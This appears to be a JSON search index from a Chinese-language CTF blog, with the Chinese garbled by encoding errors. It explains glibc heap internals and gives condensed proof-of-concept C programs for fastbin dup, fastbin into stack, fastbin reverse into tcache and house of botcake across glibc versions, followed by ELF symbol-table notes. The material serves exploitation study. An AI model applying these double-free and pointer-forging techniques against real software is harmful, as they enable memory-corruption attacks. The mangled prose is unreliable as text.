


[{"content":"\rhhh #\rhhhh #\rhhh #\r","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/heap/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Basics","type":"posts"},{"content":"\rFast bin attack #\rWhat\u0026rsquo;s fast bin #\rfastbinè¢«å­˜æ”¾åœ¨fastbinYæ•°ç»„ä¸­ï¼Œè¯¥æ•°ç»„ä¸€å…±æœ‰10ä¸ªå…ƒç´ ã€‚\næ¯ä¸ªfast binéƒ½æ˜¯ä¸€ä¸ªå•é“¾è¡¨ï¼Œåªæ˜¯ä½¿ç”¨fdæŒ‡é’ˆã€‚fast binæ— è®ºæ˜¯æ·»åŠ è¿˜æ˜¯ç§»é™¤éƒ½æ˜¯å¯¹é“¾è¡¨å°¾è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨åå…¥å…ˆå‡ºç®—æ³•ï¼Œæ‰€ä»¥fastbinYæ•°ç»„ä¸­æ¯ä¸ªfastbinå…ƒç´ éƒ½å­˜æ”¾äº†è¯¥é“¾è¡¨çš„å°¾ç»“ç‚¹ï¼Œå°¾ç»“ç‚¹é€šè¿‡fdæŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªç»“ç‚¹ã€‚\nfastbin sizeï¼šæ•°ç»„ä¸­ç›¸åŒçš„é“¾è¡¨å­˜æ”¾çš„chunkå¤§å°ç›¸åŒï¼Œå¹¶ä¸”ä¸‹æ ‡ç›¸é‚»çš„æ•°ç»„å…ƒç´ ä¸­çš„chunké“¾è¡¨çš„chunk sizeç›¸å·®8å­—èŠ‚(å°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ chunk sizeéƒ½æ˜¯16å­—èŠ‚ï¼Œç¬¬äºŒä¸ªéƒ½æ˜¯24å­—èŠ‚ï¼Œä»¥æ­¤ç±»æ¨)ï¼Œæ‰€ä»¥é»˜è®¤æƒ…å†µä¸‹å¤§å°å°¾16åˆ°80å­—èŠ‚çš„chunkä¼šè¢«åˆ†åˆ°fast chunkä¸­ã€‚\nfastbin åˆå¹¶ï¼šä¸ä¼šå¯¹freechunkè¿›è¡Œåˆå¹¶æ“ä½œã€‚å› ä¸ºfastchunkæœ¬èº«å°±æ˜¯ä¸ºäº†å¿«é€Ÿå­˜å–chunkï¼Œæ‰€ä»¥æ¯ä¸€ä¸ªchunkçš„Pä½éƒ½æ˜¯è®¾ç½®ä¸º1(è¡¨ç¤ºå‰ä¸€ä¸ªchunkå·²ä½¿ç”¨)ã€‚ä½†æ˜¯å½“é‡Šæ”¾çš„chunkä¸è¯¥chunkç›¸é‚»çš„ç©ºé—²chunkåˆå¹¶åå¤§å°å¤§äºä¸€å®šçš„å¤§å°æ—¶(FASTBIN_CONSOLIDATION_THRESHOLD),å†…å­˜ç¢ç‰‡å¯èƒ½ä¼šæ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬å°±éœ€è¦æŠŠfast binä¸­çš„chunkéƒ½è¿›è¡Œåˆå¹¶ã€‚\nç”¨æˆ·é€šè¿‡mallocè¯·æ±‚çš„å¤§å°å¦‚æœå±äºfast chunkçš„å¤§å°èŒƒå›´ï¼Œè€Œè¿™æ—¶fast binæ”¯æŒçš„æœ€å¤§å†…å­˜å¤§å°ä»¥åŠæ‰€æœ‰çš„fast biné“¾è¡¨éƒ½æ˜¯ç©ºçš„(æ„æ€å°±æ˜¯fast biné‡Œé¢æ²¡æœ‰ä¸œè¥¿)ï¼Œæ‰€ä»¥æœ€å¼€å§‹ä½¿ç”¨mallocç”³è¯·å†…å­˜çš„æ—¶å€™å³ä½¿ç”³è¯·çš„å†…å­˜å¤§å°å±äºfast chunkçš„å†…å­˜å¤§å°ï¼Œå®ƒä¹Ÿä¸ä¼šäº¤ç»™fast binå¤„ç†ï¼Œè€Œæ˜¯äº¤ç»™small binï¼Œå¦‚æœsmall binä¹Ÿä¸ºç©ºçš„è¯å°±äº¤ç»™unsorted binã€‚\nå½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨malloc(fast bin)çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰§è¡Œ_int_mallocå‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆä¼šå‘ç°å½“å‰fast binä¸ºç©ºï¼Œå°±è½¬äº¤ç»™small binå¤„ç†ï¼Œè¿›è€Œåˆå‘ç°small bin ä¹Ÿä¸ºç©ºï¼Œå°±è°ƒç”¨malloc_consolidateå‡½æ•°å¯¹malloc_stateç»“æ„ä½“è¿›è¡Œåˆå§‹åŒ–ï¼Œmalloc_consolidateå‡½æ•°ä¸»è¦å®Œæˆä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½ï¼š\né¦–å…ˆåˆ¤æ–­å½“å‰malloc_stateç»“æ„ä½“ä¸­çš„fast binæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±è¯´æ˜æ•´ä¸ªmalloc_stateéƒ½æ²¡æœ‰å®Œæˆåˆå§‹åŒ–ï¼Œéœ€è¦å¯¹malloc_stateè¿›è¡Œåˆå§‹åŒ–ã€‚ malloc_stateçš„åˆå§‹åŒ–æ“ä½œç”±å‡½æ•°malloc_init_state(av)å®Œæˆï¼Œè¯¥å‡½æ•°å…ˆåˆå§‹åŒ–é™¤fast binä¹‹å¤–çš„æ‰€æœ‰çš„bins(æ„å»ºåŒé“¾è¡¨ï¼Œè¯¦æƒ…è§åæ–‡small binsä»‹ç»)ï¼Œå†åˆå§‹åŒ–fast binsã€‚ ç„¶åå½“å†æ¬¡æ‰§è¡Œmalloc(fast chunk)å‡½æ•°çš„æ—¶å€™ï¼Œæ­¤æ—¶fast binç›¸å…³æ•°æ®ä¸ä¸ºç©ºäº†ï¼Œå°±å¼€å§‹ä½¿ç”¨fast binã€‚ free(fast chunk)æ“ä½œï¼šè¿™ä¸ªæ“ä½œå¾ˆç®€å•ï¼Œä¸»è¦åˆ†ä¸ºä¸¤æ­¥ï¼š\nå…ˆé€šè¿‡chunksizeå‡½æ•°æ ¹æ®ä¼ å…¥çš„åœ°å€æŒ‡é’ˆè·å–è¯¥æŒ‡é’ˆå¯¹åº”çš„chunkçš„å¤§å°ï¼› ç„¶åæ ¹æ®è¿™ä¸ªchunkå¤§å°è·å–è¯¥chunkæ‰€å±çš„fast binï¼Œç„¶åå†å°†æ­¤chunkæ·»åŠ åˆ°è¯¥fast binçš„é“¾å°¾å³å¯ã€‚æ•´ä¸ªæ“ä½œéƒ½æ˜¯åœ¨_int_freeå‡½æ•°ä¸­å®Œæˆã€‚å¾—åˆ°ç¬¬ä¸€ä¸ªæ¥è‡ªäºfast binçš„chunkä¹‹åï¼Œç³»ç»Ÿå°±å°†è¯¥chunkä»å¯¹åº”çš„fast binä¸­ç§»é™¤ï¼Œå¹¶å°†å…¶åœ°å€è¿”å›ç»™ç”¨æˆ·ã€‚ fast bin dup #\rglibc2.23 #\rpocç²¾ç®€ #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); free(a); free(b); free(a); a = malloc(8); b = malloc(8); c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); assert(a == c); } glibc2.27 - glibc2.39 #\rpocç²¾ç®€ #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[8]; for (int i=0; i\u0026lt;8; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } int *a = calloc(1, 8); int *b = calloc(1, 8); int *c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); free(a); free(b); free(a); a = calloc(1, 8); b = calloc(1, 8); c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); assert(a == c); } fastbin dup consolidate #\rPOCç²¾ç®€ #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { printf(\u0026#34;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\\n\u0026#34;); void* p1 = calloc(1,0x40); printf(\u0026#34;Allocate a fastbin chunk p1=%p \\n\u0026#34;, p1); printf(\u0026#34;Freeing p1 will add it to the fastbin.\\n\\n\u0026#34;); free(p1); void* p3 = malloc(0x400); printf(\u0026#34;a chunk with chunk size 0x410. p3=%p\\n\u0026#34;, p3); assert(p1 == p3); free(p1); // vulnerability void *p4 = malloc(0x400); assert(p4 == p3); printf(\u0026#34;We now have two pointers (p3 and p4) that haven\u0026#39;t been directly freed\\n\u0026#34;); printf(\u0026#34;and both point to the same large-sized chunk. p3=%p p4=%p\\n\u0026#34;, p3, p4); printf(\u0026#34;We have achieved duplication!\\n\\n\u0026#34;); return 0; } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #define CHUNK_SIZE 0x400 int main() { void *ptr[7]; for(int i = 0; i \u0026lt; 7; i++) ptr[i] = malloc(0x40); void* p1 = malloc(0x40); for(int i = 0; i \u0026lt; 7; i++) free(ptr[i]); free(p1); void* p2 = malloc(CHUNK_SIZE); assert(p1 == p2); free(p1); // vulnerability (double free) printf(\u0026#34;It is now in the tcache (or merged with top if we had initially chosen a chunk size \u0026gt; 0x410).\\n\u0026#34;); void *p3 = malloc(CHUNK_SIZE); assert(p3 == p2); printf(\u0026#34;and both point to the same tcache sized chunk. p2=%p p3=%p\\n\u0026#34;, p2, p3); return 0; } fastbin dup into stack #\rPOCç²¾ç®€ #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { unsigned long long stack_var; fprintf(stderr, \u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, 8+(char *)\u0026amp;stack_var); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, malloc(8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d)); fprintf(stderr, \u0026#34;3rd malloc(8): %p, putting the stack address on the free list\\n\u0026#34;, malloc(8)); fprintf(stderr, \u0026#34;4th malloc(8): %p\\n\u0026#34;, malloc(8)); } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[7]; for (int i=0; i\u0026lt;7; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } unsigned long long stack_var; int *a = calloc(1,8); int *b = calloc(1,8); int *c = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd calloc(1,8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, calloc(1,8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d) - 1); //æ³¨æ„å¯¹é½ fprintf(stderr, \u0026#34;3rd calloc(1,8): %p, putting the stack address on the free list\\n\u0026#34;, calloc(1,8)); void *p = calloc(1,8); fprintf(stderr, \u0026#34;4th calloc(1,8): %p\\n\u0026#34;, p); // assert((long)__builtin_return_address(0) == *(long *)p); } fastbin_reverse_into_tcache #\rçŸ¥è¯†ç‚¹ #\rlibc 2.32ä»¥ä¸Štache å’Œfastbin ä¼šæœ‰åœ°å€åŠ å¯† ç¨‹åºæ¯å½“ä»fastbin/small binä¸­å–å‡ºä¸€ä¸ªå †å—ï¼Œä¼šå°è¯•æŠŠè¯¥binä¸­å‰©ä½™çš„å †å—æ‹¿å‡ºæ¥å»å¡«å……tcacheã€‚ POC #\rglibc 2.27 - glibc 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 7; i++) { free(ptrs[i]); } char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) { free(ptrs[i]); } size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = \u0026amp;stack_var[0]; // Empty tcache. for (i = 0; i \u0026lt; 7; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } char *q = malloc(allocsize); printf( \u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q ); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } glibc 2.32 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); // Allocate 14 times so that we can free later. char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } // Fill the tcache. for (i = 0; i \u0026lt; 7; i++) free(ptrs[i]); char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) free(ptrs[i]); size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = (size_t*)((long)\u0026amp;stack_var[0] ^ ((long)victim \u0026gt;\u0026gt; 12)); for (i = 0; i \u0026lt; 7; i++) ptrs[i] = malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); char *q = malloc(allocsize); printf(\u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } ","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/heap/fastbin_attack/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Fast bin attack","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/git/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Git","type":"posts"},{"content":"\rhhh #\rggg #\r","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/git/test/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Git","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/","section":"æˆ‘çš„åšå®¢","summary":"","title":"House ofç³»åˆ—","type":"posts"},{"content":"\rHi there ğŸ‘‹ #\rğŸ³ Principal Product Manager @ Docker ğŸ¡ Creator and maintainer of Blowfish @ Blowfish page ğŸš€ Personal blog - n9o.xyz ğŸ“š mentoring @ mentorcruise house of botcake #\rä»‹ç» #\rHouse of botcacke åˆç†åˆ©ç”¨äº† Tcache å’Œ Unsortedbin çš„æœºåˆ¶ï¼ŒåŒä¸€å †å—ç¬¬ä¸€æ¬¡ Free è¿› Unsortedbin é¿å…äº† key çš„äº§ç”Ÿï¼Œç¬¬äºŒæ¬¡ Free è¿›å…¥ Tcacheï¼Œè®©é«˜ç‰ˆæœ¬çš„ Tcache Double Free å†æ¬¡æˆä¸ºå¯èƒ½ã€‚\nPOC #\rglibc 2.27 - 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); // cause chunk overlapping puts(\u0026#34;Now we are able to cause chunk overlapping\u0026#34;); puts(\u0026#34;Step 1: fill up tcache list\u0026#34;); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } puts(\u0026#34;Step 2: free the victim chunk so it will be added to unsorted bin\u0026#34;); free(a); puts(\u0026#34;Step 3: free the previous chunk and make it consolidate with the victim chunk.\u0026#34;); free(prev); puts(\u0026#34;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\u0026#34;); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); b[0x120/8-2] = (long)stack_var; malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); printf(\u0026#34;Got control on target/stack!\\n\\n\u0026#34;); return 0; } glibc 2.32\u0026ndash;2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); // prepare the target intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } free(a); free(prev); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); puts(\u0026#34;We simply overwrite victim\u0026#39;s fwd pointer\u0026#34;); b[0x120/8-2] = (long)stack_var; // take target out puts(\u0026#34;Now we can cash out the target chunk.\u0026#34;); malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); return 0; } åˆ©ç”¨æ€è·¯ #\rç”³è¯·7ä¸ª0x100å¤§å°çš„chunk åœ¨ç”³è¯·å¤§å°ä¸º0x100çš„chunk1 ï¼Œchunk2 free 7ä¸ªchunkå¡«å……tcache free chunk2,chunk1 ï¼Œä½¿å…¶è¿›å…¥unsorted binï¼Œå¹¶å› ä¸ºè¿ç»­æ‰€ä»¥åˆå¹¶ã€‚ malloc 0x100ï¼Œä»tacheé‡Œå–å‡ºä¸€ä¸ªfree chunk free chunk2 ä½¿å…¶è¿›å…¥ tache binï¼Œè¿™æ ·tache binä¸­å°±æœ‰äº†unsorted binä¸­çš„ä¸€å—å°å†…å­˜ malloc 0x120 ä» unsorted binä¸­åˆ†å‰²å‡ºæ¥ä¸€å—å†…å­˜ï¼Œå¯è¦†ç›–chunk2çš„nextæŒ‡é’ˆ ä¼ªé€ nextæŒ‡é’ˆ ","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-botcake/","section":"æˆ‘çš„åšå®¢","summary":"","title":"House ofç³»åˆ—","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/pwn/","section":"æˆ‘çš„åšå®¢","summary":"è¿™æ˜¯ç½‘ç«™çš„ç¬¬ä¸€ç¯‡ä½ å¸–å­","title":"PWN","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/python/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Python","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/web/","section":"æˆ‘çš„åšå®¢","summary":"","title":"Web","type":"posts"},{"content":"","date":"2025 å¹´ 6 æœˆ 21 æ—¥","externalUrl":null,"permalink":"/posts/","section":"æˆ‘çš„åšå®¢","summary":"","title":"æˆ‘çš„åšå®¢","type":"posts"},{"content":"\rHouse of ç³»åˆ— #\rhouse of muney #\rELFæ–‡ä»¶è§£æ #\rèŠ‚çš„ç»“æ„ #\ré™æ€è§†å›¾ä¸‹ï¼Œç»„æˆelfæ–‡ä»¶çš„åŸºæœ¬å•ä½æ˜¯sectionï¼Œå¯ä»¥ç¿»è¯‘ä¸ºèŠ‚ã€‚\nelfå¤´ä¼šå®šä¹‰èŠ‚å¤´è¡¨(æ‰€è°“çš„è¡¨ï¼Œå…¶å®éƒ½æ˜¯æ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œæ¯”å¦‚dyn/relç­‰)\nèŠ‚å¤´è¡¨ä¸­å®šä¹‰äº†èŠ‚çš„æ•°é‡ã€æ¯ä¸ªèŠ‚çš„ç±»å‹ã€èµ·å§‹çš„è™šæ‹Ÿåœ°å€ã€‚\nä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„èŠ‚ä¸º.dynamicèŠ‚ï¼Œè¿™é‡Œé¢å­˜å‚¨è¿™ä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„æè¿°ä¿¡æ¯ã€‚\n.dynamicå®é™…æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ å¯¹åº”çš„æ•°æ®ç»“æ„ä¸ºï¼š typedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type. è¡¨ç¤ºçš„æ˜¯èŠ‚çš„ç±»å‹ */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ //è¿™ä¸ªè”åˆä½“æœ‰æ—¶å€™è¡¨ç¤ºçš„æ˜¯è¿™ä¸ªèŠ‚å¤„åœ¨èŠ‚è¡¨ä¸­çš„ä¸‹æ ‡ï¼Œæœ‰æ—¶å€™è¡¨ç¤ºè¿™ä¸ªèŠ‚çš„è™šæ‹Ÿåœ°å€ } d_un; } Elf64_Dyn; ä¸ç¬¦å·æŸ¥æ‰¾ç›¸å…³çš„æ˜¯STRTABå’ŒSYMTABèŠ‚ç±»å‹ã€‚\nSTRTABï¼šå­—ç¬¦ä¸²è¡¨ ï¼ŒåŒ…å«ä¸€å¤§ä¸²å­—ç¬¦ä¸²ï¼ŒåŒ…å«æ•´ä¸ªç¨‹åºä¸­æ‰€ä½¿ç”¨åˆ°çš„æ‰€æœ‰å­—ç¬¦ã€‚\nSYMTABï¼šç¬¦å·è¡¨ï¼ŒåŒ…å«ç¬¦å·çš„å®šä¹‰ï¼Œå…¶å¯¹åº”çš„æ•°æ®ç»“æ„ä¸ºï¼š\ntypedef struct { Elf64_Word st_name; // ç¬¦å·ååœ¨.dynsträ¸­çš„åç§» unsigned char st_info; // ç¬¦å·ç±»å‹ï¼ˆSTT_FUNCç­‰ï¼‰å’Œç»‘å®šå±æ€§ï¼ˆSTB_GLOBALç­‰ï¼‰ unsigned char st_other; //é€šå¸¸ä¸º 0ï¼Œè¡¨ç¤ºç¬¦å·å¯è§æ€§ä¸ºé»˜è®¤ï¼ˆæ— éœ€ä¿®æ”¹ï¼‰ã€‚ Elf64_Section st_shndx; // ç¬¦å·æ‰€å±çš„èŠ‚åŒºç´¢å¼• Elf64_Addr st_value; // ç¬¦å·çš„åœ°å€ï¼ˆå¦‚å‡½æ•°åœ°å€ï¼‰ Elf64_Xword st_size; // ç¬¦å·å¤§å° } Elf64_Sym; //å¦‚æœä¿®æ”¹st_nameè¿™ä¸ªä¸‹æ ‡ï¼Œå°±èƒ½è§£æå‡ºä¸åŒçš„ç¬¦å·åœ°å€ã€‚ //å…³äºst_value,å½“ç¬¦å·æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–è€…å˜é‡çš„æ—¶å€™ï¼Œè¿™ä¸ªå€¼å°±ä»£è¡¨ç¬¦å·çš„è™šæ‹Ÿåœ°å€ï¼Œå¦‚æœå¼€å¯äº†PIEï¼Œé‚£ä¹ˆç¬¦å·çš„å®é™…åœ°å€å°±æ˜¯åŠ è½½çš„åŸºåœ°å€åŠ ä¸Šè¿™ä¸ªå€¼ã€‚ ç¬¦å·ç±»å‹ï¼šç¬¦å·çš„ç»‘å®šå±æ€§ï¼ˆst_infoå­—æ®µï¼‰åˆ†ä¸ºï¼š STB_LOCALï¼šå±€éƒ¨ç¬¦å·ï¼Œä»…åœ¨å½“å‰æ¨¡å—å¯è§ã€‚ 0x0 STB_GLOBALï¼šå…¨å±€ç¬¦å·ï¼Œå¯è¢«å…¶ä»–æ¨¡å—å¼•ç”¨ã€‚ 0x1 STB_WEAKï¼šå¼±ç¬¦å·ï¼Œä¼˜å…ˆçº§ä½äºå…¨å±€ç¬¦å·ã€‚ 0x2 ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨æè¿°äº†æ€ä¹ˆæ‰¾åˆ°ç¬¦å·ï¼Œä½†æ˜¯å¦‚ä½•æ ‡è¯†å“ªäº›ç¬¦å·éœ€è¦é‡å®šä½ï¼Œåˆ™éœ€è¦ä½¿ç”¨åˆ°é‡å®šä½è¡¨ã€‚\né‡å®šä½è¡¨æ•°æ®ç»“æ„\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; r_offsetï¼šè¿™ä¸ªå€¼ä»£è¡¨å¯¹åº”ç¬¦å·åœ¨gotè¡¨ä¸­çš„åœ°å€ã€‚ä½¿ç”¨ libc.got['xxx']å¾—åˆ°çš„å°±æ˜¯è¿™ä¸ªåœ°å€ã€‚ r_infoï¼šæœ‰ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä½32ä½è¡¨ç¤ºé‡å®šä½å…¥å£çš„ç±»å‹ï¼Œé«˜32ä½è¡¨ç¤ºè¿™ä¸ªé‡å®šä½ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ä¸‹æ ‡ã€‚ ret2pltæµç¨‹å›¾\nplt[0]å¤„ä»£ç \npush ModuleID jmp _dl_runtime_resolve ç¬¬ä¸€æ¬¡è°ƒç”¨gotè¡¨å¤„ä»£ç \npush n jmp plt[0] .gnu.hash èŠ‚çš„ç»“æ„ #\r.gnu.hash èŠ‚çš„ç»“æ„å¦‚ä¸‹ï¼ˆä»¥64ä½ELFä¸ºä¾‹ï¼‰ï¼š\nnbuckets (4å­—èŠ‚)ï¼šå“ˆå¸Œæ¡¶çš„æ•°é‡ã€‚ symndx (4å­—èŠ‚)ï¼šç¬¬ä¸€ä¸ªå…¨å±€ç¬¦å·åœ¨åŠ¨æ€ç¬¦å·è¡¨ï¼ˆ.dynsymï¼‰ä¸­çš„ç´¢å¼•ã€‚ maskwords (4å­—èŠ‚)ï¼šå¸ƒéš†è¿‡æ»¤å™¨æ©ç çš„ä½æ•°ï¼ˆä»¥ _wordsize ä¸ºå•ä½ï¼‰ã€‚ shift2 (4å­—èŠ‚)ï¼šå¸ƒéš†è¿‡æ»¤å™¨è®¡ç®—çš„ä½ç§»å€¼ã€‚ å¸ƒéš†è¿‡æ»¤å™¨æ•°ç»„ï¼šæ¯ä¸ªå…ƒç´ å¤§å°ä¸º _wordsize å­—èŠ‚ï¼ˆ64ä½ä¸‹ä¸º8å­—èŠ‚ï¼‰ã€‚ å“ˆå¸Œæ¡¶æ•°ç»„ï¼šæ¯ä¸ªæ¡¶æ¡ç›®å 4å­—èŠ‚ï¼ŒæŒ‡å‘ç¬¦å·é“¾è¡¨çš„èµ·å§‹ç´¢å¼•ã€‚ 